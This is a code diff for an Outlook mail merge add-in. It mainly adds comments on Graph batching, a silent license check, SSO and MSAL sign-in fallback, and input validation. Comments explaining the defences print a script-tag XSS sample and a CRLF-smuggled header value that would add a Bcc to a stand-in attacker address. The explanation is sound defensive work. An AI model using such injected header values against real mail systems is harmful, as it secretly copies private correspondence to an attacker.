@@ -109,24 +109,78 @@
  *   7. SPF/DKIM/DMARC DNS pre-flight check: warns for large sends (500+) if DNS records missing
  */
 
+// ── Microsoft Graph API constants ─────────────────────────────────────────
+// Graph's $batch endpoint lets us send up to 20 API calls in a single HTTP
+// request. This massively reduces round-trips and is critical for large merges.
+// Without batching, sending 200 emails would require 200 separate HTTP requests.
 const GRAPH_BATCH_URL     = "https://graph.microsoft.com/v1.0/$batch";
+
+// How many sendMail calls to pack into each $batch request. Graph's hard limit
+// is 20 — exceeding it returns a 400 error. We reduce this dynamically when
+// per-recipient attachments are present (larger payloads = smaller batches).
 const BATCH_SIZE          = 20;
-const BATCH_DELAY_MS      = 1500;   // default — overridden at runtime by batchDelayInput
+
+// Milliseconds to wait between consecutive batch requests. Without a delay,
+// back-to-back batches can trigger Graph's throttle (429 Too Many Requests).
+// 1500 ms ≈ 13 emails/sec, well within Microsoft's per-user send limits.
+// Overridden at runtime by the batchDelayInput UI control.
+const BATCH_DELAY_MS      = 1500;
+
+// How many times to retry a failed batch request before giving up. Graph
+// sends 429 responses with a Retry-After header when rate-limited; the
+// retry loop reads that header and waits the specified time before retrying.
 const MAX_RETRIES         = 3;
 
 // ── Licensing ──────────────────────────────────────────────────────────────
-// Set LICENSE_ENFORCEMENT = true to enforce the license gate.
-// While false the check still runs silently — flip to true when ready to go live.
+// LICENSE_ENFORCEMENT = false means the license check runs silently in the
+// background — it logs the result but never blocks features. Flip to true
+// when you want to gate the add-in behind a paid subscription. This way you
+// can ship the check code to production first, verify it works correctly in
+// the logs, and then flip the flag when ready — with zero code changes.
+// IMPORTANT: never change this without explicit instruction from Leighton.
 const LICENSE_ENFORCEMENT      = false;
+
+// The Azure Function URL that validates a user's subscription. Replace
+// YOUR_FUNCTION_APP with the actual Function App name before going live.
+// The function receives userId + tenantId as query params and returns
+// { licensed: bool, plan: string, token: string, expiresAt: ISO date }.
 const LICENSE_API_URL          = "https://YOUR_FUNCTION_APP.azurewebsites.net/api/license";
+
+// localStorage keys for the license cache. We cache the result for 24 hours
+// so the add-in doesn't hit the license API on every startup — that would be
+// slow and hammers your Azure Function bill unnecessarily.
 const LICENSE_CACHE_KEY        = "mailmerge_license_token";
 const LICENSE_CACHE_EXPIRY_KEY = "mailmerge_license_expiry";
 // ──────────────────────────────────────────────────────────────────────────
+
+// RFC 5322-compliant email address regex. More permissive than a simple
+// "contains @" check but strict enough to catch typos like "bob@" or "@company.com".
+// We use this everywhere we need to validate an address before sending to Graph.
+// Note: this regex does NOT allow IP-address domains (e.g. user@[192.168.1.1])
+// which is intentional — Exchange Online doesn't accept them anyway.
 const EMAIL_REGEX         = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$/;
-// P3: hoisted to module scope — prevents recompilation on every personalize() call
+
+// Regex that matches mail merge tokens like {{first_name}} or {{field|Fallback}}.
+// The two capture groups are: (1) the field key, (2) the optional fallback value
+// after the pipe. Declared at module scope (hoisted) so JavaScript compiles the
+// regex once when the script loads rather than recompiling it inside every call
+// to personalize(). The 'g' flag means it finds ALL tokens in a template.
+// IMPORTANT: always reset TOKEN_REGEX.lastIndex = 0 before calling .replace()
+// or .exec() in a loop — the 'g' flag maintains state between calls, and
+// forgetting to reset it causes intermittent "skips every other token" bugs.
 const TOKEN_REGEX         = /\{\{([^}|]+)(?:\|([^}]*))?\}\}/gi;
+
+// Hard cap on recipient list size — prevents UI freezes on huge CSV files.
+// Graph can handle much larger sends; this limit is about browser performance.
 const MAX_RECIPIENTS      = 10000;
+
+// Graph's documented limit per sendMail request is 4 MB. We warn at 3.5 MB
+// to leave headroom for base64-encoded attachments and JSON overhead.
 const MAX_PAYLOAD_BYTES   = 3.5 * 1024 * 1024;
+
+// Graph's limit for a single attachment is 3 MB (via the non-resumable path).
+// For larger files you'd need the resumable upload session API — we don't support
+// that here, so anything above this limit is rejected with a warning.
 const MAX_ATTACHMENT_BYTES = 3 * 1024 * 1024;
 
 const LS_KEY_SUBJECT      = "mailmerge_subject";
@@ -227,75 +281,113 @@ let selectedDirectory = new Set();
  * block any features. Flip LICENSE_ENFORCEMENT = true when ready to gate the product.
  */
 async function checkLicense() {
-  // 1. Check local cache first (avoid API call on every startup)
+  // ── Step 1: check the local cache ────────────────────────────────────────
+  // Before making any network request, check whether we already have a valid
+  // license result cached in localStorage. The cache key holds the license token
+  // and the expiry key holds a Unix timestamp (ms). If both exist and the
+  // timestamp hasn't expired, we trust the cached result and skip the API call.
+  // parseInt with radix 10 is explicit best-practice — always pass the radix
+  // to avoid surprising behaviour if the string starts with "0x" or "0".
   const cachedToken  = localStorage.getItem(LICENSE_CACHE_KEY);
   const cachedExpiry = localStorage.getItem(LICENSE_CACHE_EXPIRY_KEY);
   if (cachedToken && cachedExpiry && Date.now() < parseInt(cachedExpiry, 10)) {
     log("License: valid (cached)", "info");
-    return;
+    return; // Exit early — no need to hit the API
   }
 
-  // 2. Get user identity from MSAL token claims (already authenticated by this point)
+  // ── Step 2: read user profile from the Office mailbox object ─────────────
+  // Office.context.mailbox.userProfile gives us the signed-in user's email
+  // address without needing a Graph call. This is available as soon as
+  // Office.onReady fires, which has already happened before checkLicense runs.
   let userId   = null;
   let tenantId = null;
   let email    = null;
   try {
     const account = Office.context.mailbox.userProfile;
-    email    = account && account.emailAddress ? account.emailAddress : null;
-    // Extract tenantId and userId from the Office identity token if available
+    // Guard against null — on some Outlook versions userProfile may not be populated
+    email = account && account.emailAddress ? account.emailAddress : null;
+    // userId and tenantId come from the JWT token claims below, not from this object
     const idToken = Office.context.auth && Office.context.auth.getAccessTokenAsync
       ? null  // Will be populated below via getAccessTokenAsync
       : null;
   } catch (e) {
+    // Non-fatal: we still attempt the SSO path below, which gives us the claims
     log("License: could not read Office profile — " + e.message, "warn");
   }
 
-  // 3. Use Office SSO to get a token with user identity claims
+  // ── Step 3: get Office SSO token and extract user identity claims ─────────
+  // Office.auth.getAccessToken returns a JWT signed by Microsoft. We decode
+  // the middle (payload) segment to extract:
+  //   tid = tenant ID (identifies the organisation's Microsoft 365 tenant)
+  //   oid = object ID (uniquely identifies the user within Entra ID)
+  // These two values together uniquely identify the paying customer.
+  // We use allowSignInPrompt: false so this runs silently in the background —
+  // we never want the license check to interrupt the user with a sign-in popup.
+  // If SSO isn't available (code 13000, etc.) we just skip the check rather
+  // than blocking the user — the add-in fails open, not closed.
   let ssoToken = null;
   try {
     await new Promise((resolve) => {
       Office.auth.getAccessToken({ allowSignInPrompt: false, allowConsentPrompt: false }, (result) => {
         if (result.status === Office.AsyncResultStatus.Succeeded) {
           ssoToken = result.value;
-          // Decode JWT payload (middle segment) to extract tid and oid
+          // A JWT has three dot-separated Base64url-encoded segments:
+          //   header.payload.signature
+          // We only need the payload (index [1]). Base64url uses - and _ instead
+          // of + and /, so we swap those before calling atob() which expects
+          // standard Base64. JSON.parse then turns the decoded string into an object.
           try {
             const payload = JSON.parse(atob(ssoToken.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));
-            tenantId = payload.tid || null;
-            userId   = payload.oid || null;
-          } catch { /* non-fatal */ }
+            tenantId = payload.tid || null; // Tenant ID — identifies the organisation
+            userId   = payload.oid || null; // Object ID — identifies the individual user
+          } catch { /* non-fatal — payload may not decode on some token issuers */ }
         }
-        resolve();
+        resolve(); // Always resolve so the outer await continues regardless of success/failure
       });
     });
   } catch (e) {
+    // SSO can fail in many environments (legacy Outlook, IMAP-only, etc.) — non-fatal
     log("License: SSO token unavailable — " + e.message, "warn");
   }
 
+  // If we couldn't identify the user, skip the check entirely.
+  // The add-in continues to work — we never block on a failed identity lookup.
   if (!userId || !tenantId) {
     log("License: could not determine user identity, skipping check.", "warn");
     return;
   }
 
-  // 4. Call the license API
+  // ── Step 4: call the remote license API ──────────────────────────────────
+  // URLSearchParams builds a properly encoded query string from key-value pairs.
+  // Using it instead of string concatenation prevents parameter injection if
+  // any of the values contain special characters like &, =, or #.
   try {
     const params = new URLSearchParams({ userId, tenantId });
-    if (email) params.set("email", email);
+    if (email) params.set("email", email); // Optional — helps with support lookup
+
+    // Await the fetch. If the server is down, the catch block below handles it.
     const res = await fetch(`${LICENSE_API_URL}?${params.toString()}`);
 
     if (!res.ok) {
+      // res.ok is true for 2xx status codes. Anything else (4xx, 5xx) is a server error.
+      // We warn but never block — a flaky API server should never prevent email sends.
       log(`License API returned ${res.status} — treating as unlicensed.`, "warn");
       if (LICENSE_ENFORCEMENT) showLicenseGate("server_error");
       return;
     }
 
+    // Parse the JSON response body. Expected shape:
+    //   { licensed: bool, plan: string, token: string, expiresAt: ISO8601, reason?: string }
     const data = await res.json();
 
     if (data.licensed) {
       log(`License: active — plan: ${data.plan}`, "info");
-      // Cache the token until its expiry
+      // Cache until the server-provided expiry so we don't hit the API on every startup.
+      // new Date(data.expiresAt).getTime() converts the ISO string to a Unix timestamp in ms.
       localStorage.setItem(LICENSE_CACHE_KEY, data.token || "valid");
       localStorage.setItem(LICENSE_CACHE_EXPIRY_KEY, String(new Date(data.expiresAt).getTime()));
     } else {
+      // Licensed = false — the server explicitly says this user/tenant isn't subscribed.
       log(`License: not active — reason: ${data.reason}`, "warn");
       if (LICENSE_ENFORCEMENT) showLicenseGate(data.reason);
     }
@@ -3092,13 +3184,34 @@ function findUnresolvedTokens(text) {
   return matches ? [...new Set(matches)] : [];
 }
 
+/**
+ * escapeHtml(str) — the critical XSS defence for the HTML email body.
+ *
+ * Every value from the CSV that gets inserted into an HTML email body MUST go
+ * through this function first. Without it, a CSV cell containing:
+ *   <script>alert("hacked")</script>
+ * would be injected verbatim into the recipient's email and execute in their browser.
+ *
+ * The five replacements cover all the characters that have special meaning in HTML:
+ *   & → &amp;   (must be first — otherwise subsequent replacements would double-escape)
+ *   < → &lt;    (closes open tags, starts new ones)
+ *   > → &gt;    (closes open tags)
+ *   " → &quot;  (breaks out of attribute values like <img src="...">)
+ *   ' → &#039;  (breaks out of single-quoted attributes; &apos; isn't universally supported)
+ *
+ * Note: String(str) coerces null/undefined/numbers to strings before replacing.
+ * Calling .replace() on null would throw a TypeError without this coercion.
+ *
+ * Subject line values are NOT escaped through this function — the subject is
+ * plain text, not HTML, so & in a subject should appear literally, not as &amp;.
+ */
 function escapeHtml(str) {
   return String(str)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#039;");
+    .replace(/&/g, "&amp;")   // Always first — prevents double-escaping of subsequent replacements
+    .replace(/</g, "&lt;")    // Prevents opening HTML tags in injected content
+    .replace(/>/g, "&gt;")    // Prevents closing HTML tags in injected content
+    .replace(/"/g, "&quot;")  // Prevents breaking out of double-quoted HTML attributes
+    .replace(/'/g, "&#039;"); // Prevents breaking out of single-quoted HTML attributes
 }
 
 function stripHtmlToText(html) {
@@ -3128,51 +3241,105 @@ function parseAddressList(raw) {
     .map(address => ({ emailAddress: { address } }));
 }
 
+/**
+ * parseCustomHeaders(str) — parses the "Custom headers" textarea into Graph-compatible objects.
+ *
+ * Input format (one header per line):
+ *   X-Campaign-ID: summer-2026
+ *   X-Mailer: MailMergeAddin/2.6
+ *
+ * The function returns an array of { name, value } objects that get appended to the
+ * Graph sendMail request's internetMessageHeaders array.
+ *
+ * SECURITY — CRLF injection defence:
+ * HTTP headers are separated by \r\n (CRLF). If a user entered a header value like:
+ *   X-Foo: bar\r\nBcc: attacker@evil.com
+ * without sanitisation, the injected \r\n would create a rogue Bcc header in the raw
+ * MIME message and silently copy every email to an attacker. The .replace(/[\r\n]/g, "")
+ * calls strip ALL carriage returns and newlines from both the header name and value.
+ */
 function parseCustomHeaders(str) {
-  if (!str || !str.trim()) return [];
-  return str.split("\n")
-    .map(line => line.trim())
-    .filter(line => line.includes(":"))
+  if (!str || !str.trim()) return []; // Nothing entered — return empty array, not null
+
+  return str.split("\n")           // Split textarea content into individual lines
+    .map(line => line.trim())       // Remove leading/trailing whitespace from each line
+    .filter(line => line.includes(":")) // Skip blank lines and lines without a colon separator
     .map(line => {
+      // Find the first colon — this is the header name/value separator.
+      // We use indexOf (not split(":")) so a value like "URL: https://x.com:443"
+      // doesn't get split at the port number colon.
       const colonIdx = line.indexOf(":");
       return {
-        name:  line.slice(0, colonIdx).trim().replace(/[\r\n]/g, ""),   // S6: strip CRLF injection
-        value: line.slice(colonIdx + 1).trim().replace(/[\r\n]/g, "")   // S6: strip CRLF injection
+        name:  line.slice(0, colonIdx).trim().replace(/[\r\n]/g, ""),   // S6: strip CRLF injection from name
+        value: line.slice(colonIdx + 1).trim().replace(/[\r\n]/g, "")   // S6: strip CRLF injection from value
       };
     })
-    .filter(h => h.name && h.value);
+    .filter(h => h.name && h.value); // Drop any entries where name or value is empty after trimming
 }
 
 /* ─── EMAIL VALIDATION ─────────────────────────────────────────── */
 
+/**
+ * validateRecipients(recipients) — filters the parsed recipient list before sending.
+ *
+ * Does three things for each row:
+ *   1. skip_if check: if the skip_if CSV column is truthy (non-empty, non-zero,
+ *      non-"false", non-"no"), the row is silently excluded from the send.
+ *      This lets users mark specific rows to skip without deleting them from the CSV.
+ *   2. Email presence check: rows with no email address are logged and skipped.
+ *   3. Email format validation: the email field can hold multiple addresses
+ *      (semicolon/comma/space-separated). Each address is individually validated
+ *      against EMAIL_REGEX. The row is kept if at least ONE address is valid.
+ *
+ * @param {Array<Object>} recipients - the parsed CSV rows from parsedRecipients
+ * @returns {{ valid: Array<Object>, invalid: Array<{row, email}> }}
+ */
 function validateRecipients(recipients) {
-  const valid   = [];
-  const invalid = [];
+  const valid   = []; // Rows that passed all checks — these get emails sent
+  const invalid = []; // Rows that failed email validation — logged in the UI
+
   for (let i = 0; i < recipients.length; i++) {
     const r = recipients[i];
 
-    // skip_if column: skip row if value is truthy (non-empty, non-zero, non-false)
+    // skip_if column: any truthy value (except "0", "false", "no") means skip.
+    // We lowercase for case-insensitive comparison — "False", "NO", "FALSE" all skip.
+    // String() coerces null/undefined to "".
     const skipVal = String(r.skip_if !== null && r.skip_if !== undefined ? r.skip_if : "").trim().toLowerCase();
     if (skipVal && skipVal !== "0" && skipVal !== "false" && skipVal !== "no") {
       log(`Row ${r._csvRow || (i + 2)} (${r.email || "?"}): skipped — skip_if = "${r.skip_if}"`, "info");
-      continue;
+      continue; // Don't add to valid or invalid — it's an intentional skip
     }
 
+    // r._csvRow is stamped by parseCSV to preserve the original 1-based row number
+    // (1 = header, so data rows start at 2). We use it in log messages so the user
+    // can find the problematic row in their spreadsheet.
     if (!r.email) {
       log(`Row ${r._csvRow || (i + 2)}: missing email address — row skipped.`, "warning");
       continue;
     }
+
+    // Split on any combination of semicolons, commas, or whitespace — this handles
+    // both "a@b.com; c@d.com" (Outlook-style) and "a@b.com,c@d.com" (CSV-style).
     const addresses = r.email.split(/[;,\s]+/).map(s => s.trim()).filter(Boolean);
-    // Log a warning for each invalid address in a multi-address row
+
+    // Log a warning for each individual invalid address — helpful when one address
+    // in a multi-TO row is a typo and the others are fine.
     addresses.forEach(addr => {
       if (!EMAIL_REGEX.test(addr)) {
         log(`Row ${r._csvRow || (i + 2)}: invalid address skipped — "${addr}"`, "warning");
       }
     });
-    const hasValid  = addresses.some(a => EMAIL_REGEX.test(a));
-    if (hasValid) { valid.push(r); }
-    else          { invalid.push({ row: i + 2, email: r.email }); }
+
+    // A row is valid if at least one of its addresses passes EMAIL_REGEX.
+    // .some() stops as soon as it finds the first valid one — efficient.
+    const hasValid = addresses.some(a => EMAIL_REGEX.test(a));
+    if (hasValid) {
+      valid.push(r); // Keep the row — sendBatchWithRetry will filter out individual bad addresses
+    } else {
+      invalid.push({ row: i + 2, email: r.email }); // All addresses were bad — report to user
+    }
   }
+
   return { valid, invalid };
 }
 
@@ -3212,10 +3379,14 @@ function ssoErrorMessage(code) {
       return "Your organisation's policies prevented the consent prompt from appearing. " +
              "An administrator must grant permissions for this add-in in Entra ID.";
     case 13009:
+      // IMPORTANT: the client_id here MUST be the Azure app registration CLIENT_ID
+      // (d06ae3cf-...), NOT the Teams manifest add-in ID (a3a648da-...).
+      // An admin visiting this URL grants consent for the Azure app to call Graph on
+      // behalf of users in the tenant. Using the wrong ID sends the admin to a dead URL.
       return "Admin consent is required before this add-in can send email. " +
              "Your Microsoft 365 administrator must grant permissions. Ask them to visit: " +
              "https://login.microsoftonline.com/common/adminconsent" +
-             "?client_id=a3a648da-9dc0-48ce-948a-ba2434afcadd";
+             "?client_id=d06ae3cf-a7da-4264-b20e-ab8d70c06977";
     case 13010:
       return "A navigation error occurred in the sign-in flow. " +
              "Please try again. If the problem persists, update Edge.";
@@ -3231,22 +3402,76 @@ function ssoErrorMessage(code) {
   }
 }
 
+/**
+ * getAccessToken() — the main auth entry point for every Graph API call.
+ *
+ * Strategy (two-tier):
+ *   Tier 1 — Office SSO (getAccessTokenAsync):
+ *     Office silently acquires a token using the host app's (Outlook's) existing
+ *     sign-in session. No popup, no redirect — the user never sees it. This works
+ *     when the tenant's Entra ID is configured correctly and the user is signed in
+ *     with a work/school account. It's the preferred path: fast and invisible.
+ *
+ *   Tier 2 — MSAL dialog fallback (getTokenViaDialog):
+ *     When Office SSO fails for any reason (wrong IdP, federation misconfiguration,
+ *     Duo MFA, legacy Outlook version, etc.), we fall back to opening an Office
+ *     dialog popup that runs a full MSAL browser-based auth flow. The user sees
+ *     the Microsoft sign-in page (and Duo if MFA is required), and the token comes
+ *     back via a message from the dialog.
+ *
+ * Returns a Promise<string> that resolves to an access token string or rejects
+ * with a human-readable Error for the user to act on.
+ */
 function getAccessToken() {
+  // We wrap the callback-based Office API in a Promise so callers can use
+  // async/await instead of nested callbacks — much cleaner call sites.
   return new Promise((resolve, reject) => {
     Office.context.auth.getAccessTokenAsync(
-      { allowSignInPrompt: true, allowConsentPrompt: true, forMSGraphAccess: true },
+      {
+        allowSignInPrompt: true,    // If the user isn't signed in, show the sign-in UI
+        allowConsentPrompt: true,   // If the app needs new Graph scopes, show the consent UI
+        forMSGraphAccess: true      // Tells Office we want a Graph-compatible token (v2 endpoint)
+      },
       (result) => {
         if (result.status === Office.AsyncResultStatus.Succeeded) {
+          // Happy path: Office SSO worked. result.value is the raw JWT access token string.
+          // Pass it straight through — the caller sends it as a Bearer token to Graph.
           resolve(result.value);
         } else {
           const code = result.error.code;
-          // SSO errors that indicate config/federation issues — fall back to MSAL dialog
-          // (common with JumpCloud IdP, misconfigured Entra, or tenant SSO restrictions)
+
+          // Office SSO error codes 13000-13013 all mean "SSO isn't going to work here"
+          // for different reasons (wrong IdP, MFA required, not configured, etc.).
+          // In every case the right move is to fall back to the MSAL dialog rather than
+          // showing the user a cryptic error code. Only completely unexpected codes
+          // (outside this range) surface as hard errors.
+          //
+          // Code 13000: Office can't complete the request — legacy Mac Outlook, missing
+          //             admin consent, or Cisco Duo MFA blocking the silent flow.
+          // Code 13001: User is not signed in or token expired. Dialog re-authenticates.
+          // Code 13002: User cancelled the consent prompt. Dialog lets them try again.
+          // Code 13003: Personal Microsoft account — dialog shows work/school sign-in.
+          // Code 13004: App registration misconfigured (wrong redirect URI, missing scope).
+          // Code 13005: User account not provisioned in tenant (JumpCloud CDI sync issues).
+          // Code 13006: Internal Office error — fallback is safer than a hard failure.
+          // Code 13007: Token expired; silent refresh failed — dialog re-authenticates.
+          // Code 13008: Admin blocked consent prompts — admin must pre-consent via portal.
+          // Code 13009: Admin consent required for the org before any user can sign in.
+          // Code 13010: Navigation error in the SSO iframe — transient, dialog avoids it.
+          // Code 13012: Outlook version too old to support SSO — dialog always works.
+          // Code 13013: Too many auth requests in flight — dialog serialises the attempt.
           const fallbackCodes = [13000, 13001, 13002, 13003, 13004, 13005, 13006, 13007, 13008, 13009, 13010, 13012, 13013];
+
           if (fallbackCodes.includes(code)) {
             log("SSO unavailable (code " + code + ") — opening sign-in dialog…", "warning");
+            // Chain the dialog result directly into this Promise — if the dialog
+            // succeeds, we resolve with the token; if it fails, we reject with
+            // its error. The caller doesn't need to know which path was taken.
             getTokenViaDialog().then(resolve).catch(reject);
           } else {
+            // Unknown error code — surface a human-readable message and stop.
+            // ssoErrorMessage() maps each known code to plain English; the default
+            // case handles anything unforeseen with generic restart advice.
             reject(new Error(ssoErrorMessage(code)));
           }
         }
@@ -3257,74 +3482,171 @@ function getAccessToken() {
 
 /* ─── MSAL DIALOG FALLBACK (for JumpCloud/federation SSO failures) ─ */
 
+/**
+ * getTokenViaDialog() — MSAL browser-based auth inside an Office dialog popup.
+ *
+ * This is the Tier 2 fallback when Office SSO fails. It works like this:
+ *   1. Opens auth-dialog.html in an Office dialog popup (a separate WKWebView on Mac,
+ *      a separate window on Windows).
+ *   2. auth-dialog.html runs a full MSAL auth flow: if a cached session exists it
+ *      returns silently; otherwise it redirects through Microsoft's login page (and
+ *      Duo MFA if required), then back to auth-dialog.html with a token.
+ *   3. The token travels back to this taskpane via two parallel channels:
+ *      a) Office.context.ui.messageParent() — the preferred path. The dialog calls
+ *         this once it has the token, and DialogMessageReceived fires here.
+ *      b) localStorage — the fallback for legacy Mac Outlook where messageParent
+ *         is unavailable after the redirect chain. auth-dialog.html writes the token
+ *         to localStorage; this function polls for it on a 500 ms interval.
+ *
+ * The settle() pattern ensures only ONE of these channels wins. Whichever fires
+ * first calls settle(), which sets the `settled` flag, clears the poller, closes
+ * the dialog (if not already closed), and calls resolve/reject exactly once.
+ * The second channel hitting settle() is a no-op because `if (settled) return`.
+ *
+ * Returns a Promise<string> that resolves to the access token or rejects with Error.
+ */
 function getTokenViaDialog() {
   return new Promise((resolve, reject) => {
-    const dialogUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1) + 'auth-dialog.html?v=7';
+    // Build the auth dialog URL relative to the current page's origin + path.
+    // Using the URL constructor is safer than string manipulation — it handles
+    // edge cases like trailing slashes, query strings, or hash fragments already
+    // present in window.location.href that would corrupt a naive concatenation.
+    // The ?v=7 cache-bust query param forces Office (and browser caches) to fetch
+    // a fresh copy of auth-dialog.html on every sign-in attempt, so users never
+    // get served a stale cached version after a deployment.
+    const dialogUrl = new URL('auth-dialog.html?v=7', window.location.href).href;
 
-    // Clear any stale localStorage result before opening the dialog
+    // Remove any stale token from a previous auth attempt before opening the dialog.
+    // If we didn't do this, the localStorage poller below might instantly pick up
+    // a result from a previous session and resolve with an expired token.
     try { localStorage.removeItem('mm_auth_result'); } catch(e) {}
 
+    // settled: guards against double-resolution. A Promise can only be resolved or
+    // rejected once — calling resolve() or reject() a second time is silently ignored
+    // by the Promise spec, but relying on that would leave the poller running and the
+    // dialog unclosed. settle() is the single safe exit point.
     let settled = false;
-    let lsPoller = null;
-    let _dialog = null; // stored so settle() can close it via the localStorage path
+    let lsPoller = null;   // Reference to the setInterval so we can cancel it
+    let _dialog  = null;   // Reference to the Office dialog object so we can close it
 
+    /**
+     * settle(fn, value) — the single exit point for both auth channels.
+     * Prevents double-resolution, cleans up the poller, and closes the dialog.
+     * @param {Function} fn    - resolve or reject
+     * @param {*}        value - the token string (for resolve) or Error (for reject)
+     */
     function settle(fn, value) {
-      if (settled) return;
+      if (settled) return; // Already resolved/rejected by the other channel — bail out
       settled = true;
+
+      // Stop polling localStorage — no need once we have the result
       if (lsPoller) { clearInterval(lsPoller); lsPoller = null; }
+
+      // Clean up the localStorage key so it doesn't persist as a security artefact.
+      // The token has a 60-second TTL anyway, but explicit cleanup is best practice.
       try { localStorage.removeItem('mm_auth_result'); } catch(e) {}
-      // Close the dialog from the taskpane side — needed when the localStorage
-      // fallback path resolves the token (messageParent unavailable in legacy Mac Outlook).
+
+      // Close the dialog from the taskpane side. This is specifically needed when the
+      // localStorage path resolves first (legacy Mac Outlook), because the dialog's
+      // window.close() call fires 1.2 s after writing to localStorage — the dialog
+      // may still be open when settle() runs. Calling _dialog.close() here dismisses
+      // it immediately rather than leaving it hanging on screen.
       if (_dialog) { try { _dialog.close(); } catch(e) {} _dialog = null; }
+
+      // Call the actual resolve() or reject() with the token or error
       fn(value);
     }
 
-    // Fallback for legacy Mac Outlook: messageParent is unavailable after dialog load,
-    // so the auth dialog writes its result to localStorage. Poll for it here.
+    // ── Channel B: localStorage poller (legacy Mac Outlook fallback) ─────────
+    // Legacy Mac Outlook's WKWebViews for taskpane and dialog are on the same origin
+    // (leighton-grey.github.io), so they share localStorage. auth-dialog.html writes
+    // the token to 'mm_auth_result' after the redirect flow completes. We poll every
+    // 500 ms to detect it. This is the fallback for when messageParent (Channel A) is
+    // unavailable — typically after a multi-hop redirect chain (Microsoft → Duo → back).
     lsPoller = setInterval(() => {
       try {
         const raw = localStorage.getItem('mm_auth_result');
-        if (!raw) return;
-        const msg = JSON.parse(raw);
-        if (!msg.ts || Date.now() - msg.ts > 60000) return; // ignore if older than 60s
-        if (msg.type === 'token') {
-          settle(resolve, msg.token);
-        } else {
-          settle(reject, new Error(msg.message || 'Authentication failed'));
-        }
-      } catch(e) {}
-    }, 500);
+        if (!raw) return; // Nothing written yet — keep polling
 
+        const msg = JSON.parse(raw); // Expected: { type, token|message, ts }
+
+        // Ignore results older than 60 seconds — they're from a previous auth attempt
+        // that wasn't cleaned up. The 60 s window is generous enough to cover slow
+        // Duo MFA flows without risking replay of genuinely stale tokens.
+        if (!msg.ts || Date.now() - msg.ts > 60000) return;
+
+        // Route based on whether the dialog succeeded or failed
+        if (msg.type === 'token') {
+          settle(resolve, msg.token); // Token successfully retrieved — resolve the Promise
+        } else {
+          settle(reject, new Error(msg.message || 'Authentication failed')); // Auth failed
+        }
+      } catch(e) {
+        // JSON.parse or localStorage access failed — silently ignore and keep polling.
+        // The dialog will eventually write a complete/valid JSON string.
+      }
+    }, 500); // Poll every 500 ms — fast enough to feel responsive, cheap enough to not matter
+
+    // ── Open the Office dialog popup ─────────────────────────────────────────
+    // displayDialogAsync opens auth-dialog.html in a new Office-managed popup window.
+    // height and width are percentages of the screen dimensions, not pixels.
+    // promptBeforeOpen: false skips the "Allow this add-in to open a dialog?" confirmation
+    // that Office shows by default — users shouldn't need to click through that.
     Office.context.ui.displayDialogAsync(
       dialogUrl,
       { height: 60, width: 35, promptBeforeOpen: false },
       (asyncResult) => {
         if (asyncResult.status === Office.AsyncResultStatus.Failed) {
+          // Office couldn't open the dialog at all (e.g., popups blocked at OS level).
+          // Settle as rejected — the lsPoller would run forever otherwise.
           settle(reject, new Error("Could not open sign-in dialog: " + asyncResult.error.message));
           return;
         }
-        const dialog = asyncResult.value;
-        _dialog = dialog; // expose to settle() so localStorage path can close it
 
+        const dialog = asyncResult.value; // The Office dialog object — used to close it and listen for messages
+        _dialog = dialog; // Expose to settle() so the localStorage path can close it
+
+        // ── Channel A: messageParent listener ────────────────────────────────
+        // When auth-dialog.html calls Office.context.ui.messageParent(payload), this
+        // event fires here in the taskpane with arg.message = the JSON payload string.
+        // This is the fast path for modern Outlook — no polling needed.
         dialog.addEventHandler(Office.EventType.DialogMessageReceived, (arg) => {
-          _dialog = null; // dialog closes itself after messageParent
-          dialog.close();
+          // The dialog has already called messageParent and is closing itself —
+          // null out _dialog so settle() doesn't try to call .close() on a dead reference.
+          _dialog = null;
+          dialog.close(); // Tell Office to close the dialog window from the taskpane side
+
           try {
-            const msg = JSON.parse(arg.message);
+            const msg = JSON.parse(arg.message); // Parse the JSON payload from the dialog
             if (msg.type === "token") {
-              settle(resolve, msg.token);
+              settle(resolve, msg.token); // Token OK — resolve the outer Promise
             } else {
-              settle(reject, new Error(msg.message || "Authentication failed"));
+              settle(reject, new Error(msg.message || "Authentication failed")); // Auth error from dialog
             }
           } catch {
+            // JSON.parse failed — the dialog sent something malformed. Shouldn't happen
+            // in practice but we handle it gracefully.
             settle(reject, new Error("Invalid response from auth dialog"));
           }
         });
+
+        // ── Dialog closed event ───────────────────────────────────────────────
+        // DialogEventReceived fires when the dialog is closed for any reason OTHER than
+        // messageParent — specifically:
+        //   error 12006 = user manually closed the dialog (X button), OR window.close()
+        //                 was called from inside the dialog (our fallback after messageParent
+        //                 exhaustion). We report this as "Sign-in cancelled" to the user.
+        //   other codes = unexpected closure (crash, navigation to an invalid domain, etc.)
+        // Note: if settle() was already called by the localStorage poller, this is a no-op
+        // because of the `if (settled) return` guard in settle(). That's the correct
+        // behaviour — window.close() fires AFTER localStorage is written, so by the time
+        // DialogEventReceived fires here, the Promise is already resolved.
         dialog.addEventHandler(Office.EventType.DialogEventReceived, (arg) => {
-          _dialog = null; // dialog already gone (user dismissed or window.close())
-          // 12006 = closed manually or via window.close() — only reject if not
-          // already settled by the localStorage path.
-          settle(reject, new Error(arg.error === 12006 ? "Sign-in cancelled" : "Dialog closed unexpectedly (error " + arg.error + ")"));
+          _dialog = null; // Dialog is gone — clear the reference to prevent a stale .close() call
+          settle(reject, new Error(arg.error === 12006
+            ? "Sign-in cancelled"
+            : "Dialog closed unexpectedly (error " + arg.error + ")"
+          ));
         });
       }
     );
